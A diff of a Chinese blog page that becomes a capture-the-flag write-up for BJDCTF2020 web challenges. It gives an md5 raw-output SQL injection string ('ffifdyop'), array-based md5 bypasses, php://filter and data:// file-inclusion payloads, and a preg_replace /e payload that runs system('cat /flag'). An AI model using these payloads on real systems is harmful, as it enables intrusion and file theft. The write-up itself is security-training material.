@@ -20,15 +20,27 @@
     var CONFIG = {"hostname":"sunzhengyu99.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="一路走到黑">
-<meta property="og:url" content="https://sunzhengyu99.github.io/tags/python/index.html">
+  <meta name="description" content="BJDCTF-web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF2020">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/index.html">
 <meta property="og:site_name" content="一路走到黑">
+<meta property="og:description" content="BJDCTF-web">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/md5-1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/md5.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/md5-2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/mdd5-3.png">
+<meta property="article:published_time" content="2020-09-28T12:26:38.000Z">
+<meta property="article:modified_time" content="2020-09-28T14:04:24.391Z">
 <meta property="article:author" content="sunzy">
+<meta property="article:tag" content="sql">
+<meta property="article:tag" content="md5">
+<meta property="article:tag" content="php伪协议">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/md5-1.png">
 
-<link rel="canonical" href="https://sunzhengyu99.github.io/tags/python/">
+<link rel="canonical" href="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/">
 
 
 <script id="page-configurations">
@@ -36,12 +48,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>标签: python | 一路走到黑</title>
+  <title>BJDCTF2020 | 一路走到黑</title>
   
 
 
@@ -186,57 +198,171 @@
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunzhengyu99.github.io/2020/09/28/BJDCTF2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/my.png">
+      <meta itemprop="name" content="sunzy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一路走到黑">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BJDCTF2020
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-28 20:26:38 / 修改时间：22:04:24" itemprop="dateCreated datePublished" datetime="2020-09-28T20:26:38+08:00">2020-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">python
-          <small>标签</small>
-        </h2>
-      </div>
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/28/BJDCTF2020/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/28/BJDCTF2020/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.7k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2020</span>
+        <h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a>
+
+<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12看到了提示，给出了sql语句</p>
+<p><img src="/2020/09/28/BJDCTF2020/md5-1.png" alt></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'admin'</span> <span class="keyword">where</span> <span class="keyword">password</span>=md5($pass,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里是将输入的密码进行了一次md5的加密</p>
+<p><strong>md5()函数介绍</strong></p>
+<p><img src="/2020/09/28/BJDCTF2020/md5.png" alt></p>
+<p>这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。</p>
+<p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p>
+<p>这里经常使用的字符串是<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6&lt;trash&gt;</strong> (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉)</p>
+<p>查询语句为</p>
+<p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>此查询语句结果为真</p>
+<p>提交 ffifdyop后会跳转到另外的页面，查看源码</p>
+<p><img src="/2020/09/28/BJDCTF2020/md5-2.png" alt></p>
+<p>这里直接利用md5()函数不能处理数组的特性，get提交 <code>?a[]=1&amp;b[]=2</code></p>
+<p>接下来还有一次跳转，直接post <code>param1[]=1&amp;param2[]=2</code>，拿到flag</p>
+<p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" alt></p>
+<h2 id="不过如此"><a href="#不过如此" class="headerlink" title="不过如此"></a>不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>]; <span class="comment">//get 获取一个参数text 使用data伪协议</span></span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; <span class="comment">//file参数，这里可以使用filter伪协议读取php页面源码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;  <span class="comment">//text 的内容位I have a dream</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;                              <span class="comment">//file参数不能包含flag</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span>($file); <span class="comment">//next.php 提示了下一个页面的名字 </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload:</p>
+<p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p>
+<p>对到了index.php页面的base64源码，解码后如下</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用<strong>preg_replace()使用的/e模式可以存在远程执行代码</strong></p>
+<p>在next.php在输入</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">next</span>.php?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"cat /flag"</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">php伪协议</a></p>
+<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /e模式漏洞详解</a></p>
+
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-07-18T17:42:34+08:00"
-              content="2020-07-18">
-          07-18
-        </time>
-      </div>
+    
+    
+    
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2020/07/18/jdtest/" itemprop="url">
-            <span itemprop="name">jdtest</span>
-          </a>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql/" rel="tag"># sql</a>
+              <a href="/tags/md5/" rel="tag"># md5</a>
+              <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag"># php伪协议</a>
+          </div>
 
-    </header>
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/27/homework/" rel="prev" title="网安作业">
+      <i class="fa fa-chevron-left"></i> 网安作业
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
   </article>
-
-    </div>
-  </div>
   
   
-  
-
   
 
 
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -283,6 +409,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BJDCTF-web"><span class="nav-number">1.</span> <span class="nav-text">BJDCTF-web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-md5"><span class="nav-number">1.1.</span> <span class="nav-text">easy md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不过如此"><span class="nav-number">1.2.</span> <span class="nav-text">不过如此</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
